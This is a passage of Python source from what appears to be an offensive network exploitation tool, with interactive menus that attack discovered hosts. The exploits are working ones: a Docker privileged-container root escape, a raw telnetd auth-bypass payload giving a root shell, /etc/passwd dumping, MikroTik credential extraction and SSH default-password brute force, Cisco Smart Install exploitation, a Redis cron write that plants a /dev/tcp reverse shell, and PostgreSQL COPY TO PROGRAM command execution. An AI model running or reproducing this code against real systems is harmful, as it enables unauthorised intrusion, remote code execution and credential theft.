            elif section == 'docker':
                print(f"\n{RESET}{RED}{'─'*60}")
                print(f"  DOCKER API ACTIONS  ({len(docker_hosts)} exposed daemon(s))")
                print(f"{'─'*60}{RESET}")
                for d in docker_hosts:
                    dk   = d['probes']['docker']
                    ver  = dk.get('version', '?')
                    host = dk.get('hostname', '?')
                    ctrs = dk.get('containers', '?')
                    run  = dk.get('running', '?')
                    print(f"  {d['ip']:<16} Docker {ver:<12}  host={host}  "
                          f"containers={ctrs} running={run}")

                choice = pick(
                    "Docker action",
                    [
                        ('1', 'Show Docker /version + /info data'),
                        ('2', 'List containers — docker -H tcp://IP:2375 ps -a'),
                        ('3', 'Root escape PoC — mount host / via privileged container'),
                    ]
                )

                if choice == '1':
                    for d in docker_hosts:
                        ip = d['ip']
                        dk = d['probes']['docker']
                        print(f"\n  {BOLD}[{ip}]{RESET}  {d.get('vendor', '')}")
                        for k, v in dk.items():
                            print(f"    {k}: {v}")
                        print(f"    {RED}[!] Unauthenticated — full host control possible{RESET}")

                elif choice == '2':
                    docker_cli = shutil.which('docker')
                    if not docker_cli:
                        print(f"\n{YELLOW}[~] docker CLI not found — apt install docker.io{RESET}")
                    else:
                        for d in docker_hosts:
                            ip = d['ip']
                            _run_cmd(
                                [docker_cli, '-H', f'tcp://{ip}:2375', 'ps', '-a'],
                                'docker ps — list all containers', ip, timeout=30
                            )

                elif choice == '3':
                    print(f"\n  {RED}[!] Mounts host root FS inside container — authorized targets only.{RESET}")
                    docker_cli = shutil.which('docker')
                    if not docker_cli:
                        print(f"\n{YELLOW}[~] docker CLI not found — apt install docker.io{RESET}")
                    else:
                        for d in docker_hosts:
                            ip = d['ip']
                            print(f"\n  {BOLD}[{ip}]{RESET}")
                            print(f"    docker -H tcp://{ip}:2375 run --rm -v /:/host "
                                  f"--privileged alpine chroot /host id")
                            try:
                                ans = _input_tty(f"  Execute on {ip}? [y/N]: ").strip().lower()
                            except (EOFError, KeyboardInterrupt):
                                ans = 'n'
                            if ans == 'y':
                                _run_cmd(
                                    [docker_cli, '-H', f'tcp://{ip}:2375', 'run', '--rm',
                                     '-v', '/:/host', '--privileged', 'alpine',
                                     'chroot', '/host', 'id'],
                                    'Docker root escape PoC', ip, timeout=60
                                )

            # ── Niagara Fox ───────────────────────────────────────────────────
            elif section == 'fox':
                print(f"\n{RESET}{YELLOW}{'─'*60}")
                print(f"  NIAGARA FOX ACTIONS  ({len(fox_hosts)} building system(s))")
                print(f"{'─'*60}{RESET}")
                for d in fox_hosts:
                    fox_d   = d['probes']['fox']
                    station = fox_d.get('station', fox_d.get('app', '?'))
                    ver     = fox_d.get('version', '?')
                    host    = fox_d.get('hostName', '?')
                    print(f"  {d['ip']:<16} {d['vendor'][:22]:<22}  station={station}  "
                          f"version={ver}  host={host}")

                choice = pick(
                    "Niagara Fox action",
                    [
                        ('1', 'Show Fox probe data — station, version, hostname, address'),
                        ('2', 'nmap Fox scripts — fox-info, fox-brute (port 1911/4911)'),
                        ('3', 'Metasploit Fox login scan — credential brute-force'),
                    ]
                )

                if choice == '1':
                    for d in fox_hosts:
                        ip    = d['ip']
                        fox_d = d['probes']['fox']
                        print(f"\n  {BOLD}[{ip}]{RESET}  {d.get('vendor', '')}")
                        for k, v in fox_d.items():
                            print(f"    {k}: {v}")
                        print(f"    {YELLOW}[i] Niagara controls HVAC/lighting/elevators/access{RESET}")

                elif choice == '2':
                    for d in fox_hosts:
                        ip = d['ip']
                        _run_cmd(
                            ['nmap', '-sT', '--unprivileged', '-p', '1911,4911',
                             '--script', 'fox-info,fox-brute', ip],
                            'nmap Niagara Fox scripts', ip, timeout=120
                        )

                elif choice == '3':
                    msf = shutil.which('msfconsole')
                    if not msf:
                        print(f"\n{YELLOW}[~] msfconsole not found — install Metasploit{RESET}")
                    else:
                        for d in fox_hosts:
                            ip = d['ip']
                            msf_cmds = (
                                f"use auxiliary/scanner/fox/fox_login; "
                                f"set RHOSTS {ip}; set RPORT 1911; run; exit"
                            )
                            _run_cmd([msf, '-q', '--no-database', '-x', msf_cmds],
                                     'Niagara Fox login scan', ip, timeout=120)

            # ── Telnet no-auth shell ──────────────────────────────────────────
            elif section == 'telnet_noauth':
                print(f"\n{RESET}{RED}{'─'*60}")
                print(f"  TELNET EXPLOIT MENU")
                if noauth_hosts:
                    print(f"  No-auth shells   : {len(noauth_hosts)} device(s)")
                if cve24061_hosts:
                    print(f"  CVE-2026-24061   : {len(cve24061_hosts)} device(s) — inetutils telnetd auth bypass")
                print(f"{'─'*60}{RESET}")
                for d in noauth_hosts:
                    banner = d['probes']['telnet_noauth'].get('banner', '')[:60].replace('\n', ' ')
                    print(f"  {d['ip']:<16} {d['vendor'][:24]:<24}  {banner}")
                for d in cve24061_hosts:
                    if d not in noauth_hosts:
                        vuln = d['probes']['cve_24061']
                        flag = f"{RED}[CVE-2026-24061]{RESET}" if vuln.get('shell') else f"{YELLOW}[possible]{RESET}"
                        print(f"  {d['ip']:<16} {d['vendor'][:24]:<24}  {flag}")

                choice = pick(
                    "Telnet exploit action",
                    [
                        ('1', 'Show banner — see what prompt appears without credentials'),
                        ('2', 'Open interactive session — telnet IP 23'),
                        ('3', 'Dump /etc/passwd — send command, capture output'),
                        ('4', 'CVE-2026-24061 exploit — inject USER=-f root for instant root shell'),
                    ]
                )

                if choice == '1':
                    for d in noauth_hosts:
                        ip  = d['ip']
                        pkt = d['probes']['telnet_noauth']
                        print(f"\n  {BOLD}[{ip}]{RESET}  {d.get('vendor', '')}")
                        print(f"    {RED}[!] SHELL WITHOUT ANY CREDENTIALS{RESET}")
                        print(f"    Banner: {pkt.get('banner', '')[:160]}")

                elif choice == '2':
                    telnet_cli = shutil.which('telnet')
                    if not telnet_cli:
                        print(f"\n{YELLOW}[~] telnet not found — apt install telnet{RESET}")
                    else:
                        for d in noauth_hosts:
                            ip = d['ip']
                            print(f"\n  {BOLD}[*] Connecting to {ip}:23  (Ctrl+] then quit to exit){RESET}")
                            try:
                                subprocess.run([telnet_cli, ip])
                            except KeyboardInterrupt:
                                pass

                elif choice == '3':
                    for d in noauth_hosts:
                        ip = d['ip']
                        print(f"\n  {BOLD}[{ip}]{RESET}")
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(4)
                            s.connect((ip, 23))
                            s.settimeout(3)
                            try:
                                s.recv(512)   # drain banner
                            except Exception:
                                pass
                            s.sendall(b'cat /etc/passwd\r\n')
                            time.sleep(1)
                            out = b''
                            try:
                                out = s.recv(4096)
                            except Exception:
                                pass
                            s.close()
                            text = out.decode('utf-8', errors='replace')
                            if 'root:' in text or ':x:' in text:
                                print(f"    {GREEN}[+] /etc/passwd captured:{RESET}")
                                for line in text.splitlines()[:25]:
                                    if ':' in line:
                                        print(f"      {line}")
                                with open(self.output_file, 'a') as fh:
                                    fh.write(f"\nTELNET-NOAUTH  {ip}  /etc/passwd\n{text}\n")
                            else:
                                print(f"    {YELLOW}[~] No passwd output — use option 2 for interactive session{RESET}")
                        except Exception as e:
                            print(f"    {RED}[!] Error: {e}{RESET}")

                elif choice == '4':
                    # CVE-2026-24061 — inetutils telnetd 1.9.3-2.7 auth bypass
                    # NEW_ENVIRON subnegotiation injects USER=-f root; -f skips login(1) auth
                    EXPLOIT = (
                        b'\xff\xfb\x27'              # IAC WILL NEW_ENVIRON
                        b'\xff\xfa\x27\x00\x00'     # IAC SB NEW_ENVIRON IS
                        b'USER\x01-f root'           # variable=value (-f root)
                        b'\xff\xf0'                  # IAC SE
                    )

                    def _strip_iac(data: bytes) -> bytes:
                        out, i = bytearray(), 0
                        while i < len(data):
                            if data[i] == 0xff and i + 1 < len(data):
                                cmd = data[i + 1]
                                if cmd in (0xfb, 0xfc, 0xfd, 0xfe) and i + 2 < len(data):
                                    i += 3; continue
                                elif cmd == 0xfa:
                                    j = data.find(b'\xff\xf0', i + 2)
                                    i = j + 2 if j != -1 else len(data); continue
                                elif cmd == 0xff:
                                    out.append(0xff); i += 2; continue
                            out.append(data[i]); i += 1
                        return bytes(out)

                    target_list = cve24061_hosts if cve24061_hosts else noauth_hosts
                    if not target_list:
                        print(f"\n{YELLOW}[~] No CVE-2026-24061 candidate hosts found{RESET}")
                    else:
                        for d in target_list:
                            ip = d['ip']
                            print(f"\n  {BOLD}{RED}[CVE-2026-24061] Targeting {ip}:23{RESET}")
                            print(f"  inetutils telnetd auth bypass — injecting USER=-f root")
                            print(f"  {DIM}Ctrl+C to exit session{RESET}\n")
                            try:
                                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                sock.settimeout(5)
                                sock.connect((ip, 23))
                                sock.settimeout(None)

                                # Drain initial IAC negotiation (up to 2 s)
                                sock.settimeout(2)
                                try:
                                    initial = sock.recv(512)
                                    clean = _strip_iac(initial)
                                    if clean.strip():
                                        sys.stdout.write(clean.decode('utf-8', errors='replace'))
                                        sys.stdout.flush()
                                except Exception:
                                    pass
                                sock.settimeout(None)

                                # Send exploit payload
                                sock.sendall(EXPLOIT)
                                time.sleep(0.4)

                                # Read exploit response
                                sock.settimeout(3)
                                try:
                                    resp = sock.recv(512)
                                    clean = _strip_iac(resp)
                                    sys.stdout.write(clean.decode('utf-8', errors='replace'))
                                    sys.stdout.flush()
                                except Exception:
                                    pass
                                sock.settimeout(None)

                                # Reader thread — prints all incoming data
                                import threading as _threading
                                _done = _threading.Event()

                                def _reader():
                                    while not _done.is_set():
                                        try:
                                            sock.settimeout(1)
                                            chunk = sock.recv(4096)
                                            if not chunk:
                                                break
                                            sys.stdout.write(_strip_iac(chunk).decode('utf-8', errors='replace'))
                                            sys.stdout.flush()
                                        except socket.timeout:
                                            continue
                                        except Exception:
                                            break

                                t = _threading.Thread(target=_reader, daemon=True)
                                t.start()

                                # Send one command to verify root access
                                time.sleep(0.3)
                                sock.sendall(b'id\r\n')

                                # Interactive loop
                                try:
                                    while True:
                                        cmd = input()
                                        if cmd.lower() in ('exit', 'quit'):
                                            break
                                        sock.sendall((cmd + '\r\n').encode('utf-8', errors='replace'))
                                except (KeyboardInterrupt, EOFError):
                                    pass
                                finally:
                                    _done.set()
                                    sock.close()

                            except Exception as e:
                                print(f"  {RED}[!] {ip}: {e}{RESET}")

            # ── MikroTik ──────────────────────────────────────────────────────
            elif section == 'mikrotik':
                print(f"\n{RESET}{CYAN}{'─'*60}")
                print(f"  MIKROTIK RouterOS ACTIONS  ({len(mikrotik_hosts)} device(s))")
                print(f"{'─'*60}{RESET}")
                for d in mikrotik_hosts:
                    wb  = d.get('probes', {}).get('winbox', {})
                    ver = wb.get('version', '?') if isinstance(wb, dict) else '?'
                    c14 = wb.get('cve_2018_14847', False) if isinstance(wb, dict) else False
                    flag = f"  {RED}[CVE-2018-14847]{RESET}" if c14 else ''
                    print(f"  {d['ip']:<16} {d['vendor'][:22]:<22}  Winbox {ver}{flag}")

                choice = pick(
                    "MikroTik action",
                    [
                        ('1', 'Show Winbox probe data — version, CVE-2018-14847 status'),
                        ('2', 'Metasploit Winbox credential extraction — CVE-2018-14847'),
                        ('3', 'nmap MikroTik scripts — mikrotik-routeros-brute (port 8291)'),
                        ('4', 'SSH default credential check — admin/<blank>, admin/admin …'),
                    ]
                )

                if choice == '1':
                    for d in mikrotik_hosts:
                        ip  = d['ip']
                        wb  = d.get('probes', {}).get('winbox', {})
                        print(f"\n  {BOLD}[{ip}]{RESET}  {d.get('vendor', '')}")
                        if isinstance(wb, dict) and wb.get('alive'):
                            ver = wb.get('version', 'unknown')
                            c14 = wb.get('cve_2018_14847', False)
                            print(f"    Winbox port    : {wb.get('port', 8291)}")
                            print(f"    Version        : {ver}")
                            c14_str = (f"{RED}VULNERABLE — extract all credentials unauthenticated{RESET}"
                                       if c14 else 'Not confirmed (> 6.42 or version not parsed)')
                            print(f"    CVE-2018-14847 : {c14_str}")
                            if c14:
                                print(f"    {YELLOW}[!] MSF: auxiliary/gather/mikrotik_winbox_disclosure{RESET}")
                        else:
                            print(f"    Detected via OUI / vendor — Winbox probe not responded")
                        print(f"    Open ports     : {sorted(d.get('open_tcp', []))}")

                elif choice == '2':
                    msf = shutil.which('msfconsole')
                    if not msf:
                        print(f"\n{YELLOW}[~] msfconsole not found — install Metasploit{RESET}")
                    else:
                        for d in mikrotik_hosts:
                            ip = d['ip']
                            msf_cmds = (
                                f"use auxiliary/gather/mikrotik_winbox_disclosure; "
                                f"set RHOSTS {ip}; set RPORT 8291; run; exit"
                            )
                            _run_cmd([msf, '-q', '--no-database', '-x', msf_cmds],
                                     'MikroTik CVE-2018-14847 credential dump', ip, timeout=60)

                elif choice == '3':
                    for d in mikrotik_hosts:
                        ip = d['ip']
                        _run_cmd(
                            ['nmap', '-sT', '--unprivileged', '-p', '8291,22,80',
                             '--script', 'mikrotik-routeros-brute', ip],
                            'nmap MikroTik brute', ip, timeout=120
                        )

                elif choice == '4':
                    MIKROTIK_CREDS = [
                        ('admin', ''), ('admin', 'admin'), ('admin', '1234'),
                        ('admin', 'mikrotik'), ('root', ''), ('root', 'admin'),
                    ]
                    ssh_cli = shutil.which('ssh')
                    if not ssh_cli:
                        print(f"\n{YELLOW}[~] ssh not found{RESET}")
                    else:
                        for d in mikrotik_hosts:
                            ip = d['ip']
                            print(f"\n  {BOLD}[{ip}]{RESET}")
                            if 22 not in d.get('open_tcp', []):
                                print(f"    {YELLOW}[~] SSH port not open — try option 2 (Winbox){RESET}")
                                continue
                            hit = False
                            for user, passwd in MIKROTIK_CREDS:
                                print(f"    SSH {user}:{passwd!r} ...", end=' ', flush=True)
                                try:
                                    env = {'SSHPASS': passwd} if passwd else {}
                                    cmd = [ssh_cli,
                                           '-o', 'ConnectTimeout=3',
                                           '-o', 'StrictHostKeyChecking=no',
                                           '-o', 'BatchMode=yes',
                                           f'{user}@{ip}', 'exit']
                                    r = subprocess.run(cmd, capture_output=True, timeout=5)
                                    if r.returncode == 0:
                                        print(f"{GREEN}VALID!{RESET}")
                                        with open(self.output_file, 'a') as fh:
                                            fh.write(f"\nMIKROTIK-CREDS  {ip}  {user}:{passwd}\n")
                                        hit = True
                                        break
                                    else:
                                        print('no')
                                except Exception:
                                    print('timeout')
                            if not hit:
                                print(f"    {YELLOW}[~] No default SSH creds worked{RESET}")

            # ── Cisco Smart Install ───────────────────────────────────────────
            elif section == 'cisco_smi':
                print(f"\n{RESET}{RED}{'─'*60}")
                print(f"  CISCO SMART INSTALL  ({len(cisco_smi_hosts)} device(s))")
                print(f"{'─'*60}{RESET}")
                for d in cisco_smi_hosts:
                    smi = d['probes']['cisco_smi']
                    ios = smi.get('ios_version', '?')
                    print(f"  {d['ip']:<16} {d['vendor'][:24]:<24}  IOS: {ios}")
                print(f"\n  {RED}[!] CVE-2018-0171 — unauthenticated config read/write + firmware replace{RESET}")

                choice = pick(
                    "Cisco SMI action",
                    [
                        ('1', 'Show probe data — response bytes, IOS version if detected'),
                        ('2', 'Metasploit cisco_smart_install — CVE-2018-0171 exploit'),
                        ('3', 'CVE-2023-20198 check — Cisco IOS XE Web UI auth bypass'),
                        ('4', 'nmap Cisco scripts — cisco-smi + snmp-info (port 4786/161)'),
                    ]
                )

                if choice == '1':
                    for d in cisco_smi_hosts:
                        ip  = d['ip']
                        smi = d['probes']['cisco_smi']
                        print(f"\n  {BOLD}[{ip}]{RESET}  {d.get('vendor', '')}")
                        print(f"    Port 4786 CSI  : {RED}OPEN — UNAUTHENTICATED{RESET}")
                        print(f"    Response bytes : {smi.get('response', '?')}")
                        if smi.get('ios_version'):
                            print(f"    IOS version    : {smi['ios_version']}")
                        print(f"    {RED}Impact: read/replace startup-config, push malicious firmware{RESET}")
                        print(f"    {YELLOW}Fix   : 'no vstack' on every interface + global{RESET}")

                elif choice == '2':
                    msf = shutil.which('msfconsole')
                    if not msf:
                        print(f"\n{YELLOW}[~] msfconsole not found — install Metasploit{RESET}")
                    else:
                        for d in cisco_smi_hosts:
                            ip = d['ip']
                            msf_cmds = (
                                f"use auxiliary/scanner/cisco/cisco_smart_install; "
                                f"set RHOSTS {ip}; set RPORT 4786; run; exit"
                            )
                            _run_cmd([msf, '-q', '--no-database', '-x', msf_cmds],
                                     'Cisco SMI CVE-2018-0171', ip, timeout=60)

                elif choice == '3':
                    # CVE-2023-20198 — IOS XE Web UI authentication bypass (CVSS 10.0)
                    print(f"\n{YELLOW}[*] Probing for Cisco IOS XE Web UI (CVE-2023-20198)...{RESET}")
                    for d in cisco_smi_hosts:
                        ip = d['ip']
                        print(f"\n  {BOLD}[{ip}]{RESET}")
                        found = False
                        for port in [80, 443, 8080, 8443]:
                            if port not in d.get('open_tcp', []):
                                continue
                            try:
                                s = self.prober._tcp(ip, port)
                                if not s:
                                    continue
                                req = (
                                    f'GET /webui/logoutconfirm.html?logon_hash=1 HTTP/1.0\r\n'
                                    f'Host: {ip}:{port}\r\n'
                                    f'Connection: close\r\n\r\n'
                                ).encode()
                                s.sendall(req)
                                resp = s.recv(1024)
                                s.close()
                                first = resp.decode('utf-8', errors='replace').split('\r\n')[0]
                                if ' 200 ' in first:
                                    print(f"    {RED}[+] CVE-2023-20198 LIKELY VULNERABLE"
                                          f" — 200 on /webui/logoutconfirm.html (port {port}){RESET}")
                                    with open(self.output_file, 'a') as fh:
                                        fh.write(f"\nCVE-2023-20198  {ip}:{port}  LIKELY VULNERABLE\n")
                                    found = True
                                else:
                                    print(f"    [-] port {port}: {first[:60]}")
                            except Exception as e:
                                print(f"    [~] port {port}: {e}")
                        if not found:
                            print(f"    [-] No IOS XE Web UI endpoint responded with 200")

                elif choice == '4':
                    for d in cisco_smi_hosts:
                        ip = d['ip']
                        _run_cmd(
                            ['nmap', '-sT', '--unprivileged',
                             '-p', '4786,23,80,161,443',
                             '--script', 'cisco-smi,snmp-info',
                             '--script-args', 'snmpcommunity=public',
                             ip],
                            'nmap Cisco scripts', ip, timeout=120
                        )

            # ── NFS ───────────────────────────────────────────────────────────────
            elif section == 'nfs':
                print(f"\n{RESET}{CYAN}{'─'*60}")
                print(f"  NFS SHARES  ({len(nfs_hosts)} host(s))")
                print(f"{'─'*60}{RESET}")
                for d in nfs_hosts:
                    nfs = d['probes']['nfs']
                    flag = f"  {RED}[MOUNTABLE]{RESET}" if nfs.get('mountable') else ''
                    exports = nfs.get('exports', [])
                    share_str = ', '.join(e['path'] for e in exports[:3]) if exports else 'no showmount'
                    print(f"  {d['ip']:<16} {d['vendor'][:20]:<20}  {share_str}{flag}")

                choice = pick(
                    "NFS action",
                    [
                        ('1', 'Show all exports — path + access control per host'),
                        ('2', 'Mount share — mount -t nfs IP:/path /mnt (pick share)'),
                        ('3', 'Metasploit nfsmount scanner — enumerate + access check'),
                        ('4', 'nmap NFS scripts — nfs-showmount, nfs-ls, nfs-statfs'),
                    ]
                )

                if choice == '1':
                    for d in nfs_hosts:
                        ip  = d['ip']
                        nfs = d['probes']['nfs']
                        exports = nfs.get('exports', [])
                        print(f"\n  {BOLD}[{ip}]{RESET}  {d.get('vendor', '')}")
                        if not exports:
                            print(f"    {YELLOW}[~] Port open but no exports returned (showmount unavailable){RESET}")
                        for e in exports:
                            access = e.get('access', '*')
                            flag = f"  {RED}[MOUNTABLE]{RESET}" if access in ('*', '(everyone)', 'everyone') or '0/0' in access else ''
                            print(f"    {GREEN}{e['path']:<30}{RESET}  {access}{flag}")
                        if nfs.get('showmount_timeout'):
                            print(f"    {YELLOW}[~] showmount timed out — host may filter RPC{RESET}")

                elif choice == '2':
                    mount_cli = shutil.which('mount')
                    if not mount_cli:
                        print(f"\n{YELLOW}[~] mount not found{RESET}")
                    else:
                        for d in nfs_hosts:
                            ip  = d['ip']
                            nfs = d['probes']['nfs']
                            exports = nfs.get('exports', [])
                            if not exports:
                                print(f"\n  {YELLOW}[~] {ip}: no exports to mount{RESET}")
                                continue
                            print(f"\n  {BOLD}[{ip}]{RESET}  — pick a share to mount:")
                            for i, e in enumerate(exports, 1):
                                print(f"    [{i}] {e['path']}  ({e.get('access', '*')})")
                            try:
                                idx = input(f"\n  Share number (1-{len(exports)}, Enter to skip): ").strip()
                            except (EOFError, KeyboardInterrupt):
                                idx = ''
                            if not idx.isdigit() or not (1 <= int(idx) <= len(exports)):
                                continue
                            path = exports[int(idx) - 1]['path']
                            mnt  = f"/mnt/nfs_{ip.replace('.','_')}"
                            print(f"  {BOLD}[*] mkdir -p {mnt} && mount -t nfs {ip}:{path} {mnt}{RESET}")
                            try:
                                subprocess.run(['mkdir', '-p', mnt])
                                r = subprocess.run(
                                    ['mount', '-t', 'nfs', f'{ip}:{path}', mnt],
                                    timeout=15
                                )
                                if r.returncode == 0:
                                    print(f"  {GREEN}[+] Mounted at {mnt}{RESET}")
                                    print(f"  {BOLD}[*] ls {mnt}{RESET}")
                                    subprocess.run(['ls', '-la', mnt])
                                else:
                                    print(f"  {RED}[!] Mount failed (returncode {r.returncode}){RESET}")
                            except Exception as e:
                                print(f"  {RED}[!] {e}{RESET}")

                elif choice == '3':
                    for d in nfs_hosts:
                        ip = d['ip']
                        _run_cmd(
                            ['msfconsole', '-q', '-x',
                             f'use auxiliary/scanner/nfs/nfsmount; '
                             f'set RHOSTS {ip}; '
                             f'run; exit'],
                            'MSF nfsmount', ip, timeout=120
                        )

                elif choice == '4':
                    for d in nfs_hosts:
                        ip = d['ip']
                        _run_cmd(
                            ['nmap', '-sT', '--unprivileged', '-p', '2049,111',
                             '--script', 'nfs-showmount,nfs-ls,nfs-statfs',
                             ip],
                            'nmap NFS scripts', ip, timeout=120
                        )

            # ── Redis ─────────────────────────────────────────────────────────────
            elif section == 'redis':
                print(f"\n{RESET}{RED}{'─'*60}")
                print(f"  REDIS INSTANCES  ({len(redis_hosts)} accessible)")
                print(f"{'─'*60}{RESET}")
                for d in redis_hosts:
                    r = d['probes']['redis']
                    ver  = r.get('version') or '?'
                    pw   = f"  pass={r['password']!r}" if r.get('password') else '  [NO AUTH]'
                    writ = f"  {RED}[WRITABLE]{RESET}" if r.get('writable') else ''
                    print(f"  {d['ip']:<16} Redis {ver:<10}{pw}{writ}")

                choice = pick(
                    "Redis action",
                    [
                        ('1', 'Show version + auth status + writable dir'),
                        ('2', 'Dump keys — KEYS * + GET top 20'),
                        ('3', 'RCE via cron write — write reverse shell to crontab'),
                        ('4', 'Metasploit redis_replication_cmd_exec — unauthenticated RCE'),
                    ]
                )

                if choice == '1':
                    for d in redis_hosts:
                        r   = d['ip']
                        rd  = d['probes']['redis']
                        print(f"\n  {BOLD}[{r}]{RESET}  {d.get('vendor','')}")
                        print(f"    Version   : {rd.get('version','unknown')}")
                        print(f"    Auth      : {'NONE' if rd.get('password') == '' else rd.get('password','required')}")
                        print(f"    Dir       : {rd.get('dir','?')}")
                        print(f"    Writable  : {GREEN+'YES'+RESET if rd.get('writable') else 'NO'}")

                elif choice == '2':
                    for d in redis_hosts:
                        ip = d['ip']
                        rd = d['probes']['redis']
                        print(f"\n  {BOLD}[{ip}]{RESET}  — dumping keys")
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(4)
                            s.connect((ip, 6379))
                            s.settimeout(3)
                            pw = rd.get('password','')
                            if pw:
                                s.sendall(f'*2\r\n$4\r\nAUTH\r\n${len(pw)}\r\n{pw}\r\n'.encode())
                                try: s.recv(64)
                                except Exception: pass
                            s.sendall(b'*2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n')
                            keys_raw = b''
                            try: keys_raw = s.recv(4096)
                            except Exception: pass
                            keys = [l.strip() for l in keys_raw.decode('utf-8', errors='replace').splitlines()
                                    if l.strip() and not l.startswith('*') and not l.startswith('$') and not l.startswith(':')]
                            if keys:
                                print(f"  {GREEN}[+] {len(keys)} key(s) found:{RESET}")
                                for k in keys[:20]:
                                    cmd = f'*2\r\n$3\r\nGET\r\n${len(k)}\r\n{k}\r\n'
                                    s.sendall(cmd.encode())
                                    val = b''
                                    try: val = s.recv(512)
                                    except Exception: pass
                                    val_str = val.decode('utf-8', errors='replace').strip()[:80]
                                    print(f"    {CYAN}{k}{RESET} = {val_str}")
                            else:
                                print(f"  {YELLOW}[~] No keys or empty database{RESET}")
                            s.close()
                        except Exception as e:
                            print(f"  {RED}[!] {ip}: {e}{RESET}")

                elif choice == '3':
                    for d in redis_hosts:
                        ip = d['ip']
                        rd = d['probes']['redis']
                        if not rd.get('writable'):
                            print(f"\n  {YELLOW}[~] {ip}: CONFIG dir not confirmed writable — skip{RESET}")
                            continue
                        print(f"\n  {BOLD}{RED}[RCE] {ip} — writing cron reverse shell{RESET}")
                        try:
                            lhost = input(f"  LHOST (your IP): ").strip()
                            lport = input(f"  LPORT [4444]: ").strip() or '4444'
                        except (EOFError, KeyboardInterrupt):
                            continue
                        cron_payload = f'\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n\n'
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(4)
                            s.connect((ip, 6379))
                            s.settimeout(3)
                            pw = rd.get('password', '')
                            cmds = []
                            if pw:
                                cmds.append(f'*2\r\n$4\r\nAUTH\r\n${len(pw)}\r\n{pw}\r\n')
                            cmds += [
                                b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$11\r\n/var/spool/cron\r\n',
                                b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$4\r\nroot\r\n',
                                f'*3\r\n$3\r\nSET\r\n$6\r\nshell1\r\n${len(cron_payload)}\r\n{cron_payload}\r\n'.encode(),
                                b'*1\r\n$4\r\nSAVE\r\n',
                            ]
                            for cmd in cmds:
                                s.sendall(cmd if isinstance(cmd, bytes) else cmd.encode())
                                try: s.recv(64)
                                except Exception: pass
                            s.close()
                            print(f"  {GREEN}[+] Cron payload written — start listener: nc -lvnp {lport}{RESET}")
                        except Exception as e:
                            print(f"  {RED}[!] {e}{RESET}")

                elif choice == '4':
                    for d in redis_hosts:
                        ip = d['ip']
                        _run_cmd(
                            ['msfconsole', '-q', '-x',
                             f'use exploit/linux/redis/redis_replication_cmd_exec; '
                             f'set RHOSTS {ip}; set LHOST {self.lhost}; run; exit'],
                            'MSF Redis RCE', ip, timeout=120
                        )

            # ── PostgreSQL ────────────────────────────────────────────────────────
            elif section == 'postgres':
                print(f"\n{RESET}{CYAN}{'─'*60}")
                print(f"  POSTGRESQL INSTANCES  ({len(postgres_hosts)} accessible)")
                print(f"{'─'*60}{RESET}")
                for d in postgres_hosts:
                    pg  = d['probes']['postgres']
                    ver = pg.get('version') or '?'
                    usr = pg.get('user','?')
                    pw  = pg.get('password','')
                    auth = f"{RED}[TRUST — no password]{RESET}" if pg.get('trust') else f"user={usr} pass={pw!r}"
                    print(f"  {d['ip']:<16} PostgreSQL {ver:<8}  {auth}")

                choice = pick(
                    "PostgreSQL action",
                    [
                        ('1', 'Show auth type + credentials found'),
                        ('2', 'List databases + tables (psql -c)'),
                        ('3', 'RCE via COPY TO/FROM PROGRAM (superuser required)'),
                        ('4', 'Metasploit postgres_login — default credential scan'),
                    ]
                )

                if choice == '1':
                    for d in postgres_hosts:
                        ip = d['ip']
                        pg = d['probes']['postgres']
                        print(f"\n  {BOLD}[{ip}]{RESET}  {d.get('vendor','')}")
                        print(f"    Version   : {pg.get('version','unknown')}")
                        print(f"    Auth mode : {'TRUST (no password)' if pg.get('trust') else 'password required'}")
                        if pg.get('authenticated'):
                            print(f"    User      : {GREEN}{pg.get('user','?')}{RESET}")
                            print(f"    Password  : {GREEN}{pg.get('password','<blank>')!r}{RESET}")

                elif choice == '2':
                    import shutil as _shutil
                    psql = _shutil.which('psql')
                    if not psql:
                        print(f"\n{YELLOW}[~] psql not found — apt install postgresql-client{RESET}")
                    else:
                        for d in postgres_hosts:
                            ip = d['ip']
                            pg = d['probes']['postgres']
                            if not pg.get('authenticated'):
                                print(f"\n  {YELLOW}[~] {ip}: not authenticated — skip{RESET}")
                                continue
                            import os as _os
                            env = {'PGPASSWORD': pg.get('password',''), 'PATH': '/usr/bin:/bin'}
                            user = pg.get('user','postgres')
                            print(f"\n  {BOLD}[{ip}]{RESET}  — listing databases")
                            try:
                                out = subprocess.check_output(
                                    [psql,'-h',ip,'-U',user,'-d','postgres',
                                     '-c','\\l','-t','-A'],
                                    env=env, stderr=subprocess.DEVNULL, timeout=10
                                ).decode('utf-8', errors='replace')
                                for line in out.strip().splitlines()[:30]:
                                    print(f"    {line}")
                            except Exception as e:
                                print(f"  {RED}[!] {e}{RESET}")

                elif choice == '3':
                    import shutil as _shutil
                    psql = _shutil.which('psql')
                    if not psql:
                        print(f"\n{YELLOW}[~] psql not found — apt install postgresql-client{RESET}")
                    else:
                        for d in postgres_hosts:
                            ip = d['ip']
                            pg = d['probes']['postgres']
                            if not pg.get('authenticated'):
                                print(f"\n  {YELLOW}[~] {ip}: not authenticated{RESET}")
                                continue
                            print(f"\n  {BOLD}{RED}[RCE] {ip} — COPY TO PROGRAM{RESET}")
                            try:
                                cmd_input = input(f"  Command to run on server: ").strip()
                            except (EOFError, KeyboardInterrupt):
                                continue
                            if not cmd_input:
                                continue
                            import os as _os
                            env = {'PGPASSWORD': pg.get('password',''), 'PATH': '/usr/bin:/bin'}
                            user = pg.get('user','postgres')
                            rce_sql = f"COPY (SELECT '') TO PROGRAM '{cmd_input}';"
                            try:
                                out = subprocess.run(
                                    [psql,'-h',ip,'-U',user,'-d','postgres','-c', rce_sql],
                                    env=env, capture_output=True, timeout=10, text=True
                                )
                                combined = (out.stdout + out.stderr).strip()
                                print(f"  {combined if combined else GREEN+'[+] Command sent'+RESET}")
                            except Exception as e:
                                print(f"  {RED}[!] {e}{RESET}")

                elif choice == '4':
                    for d in postgres_hosts:
                        ip = d['ip']
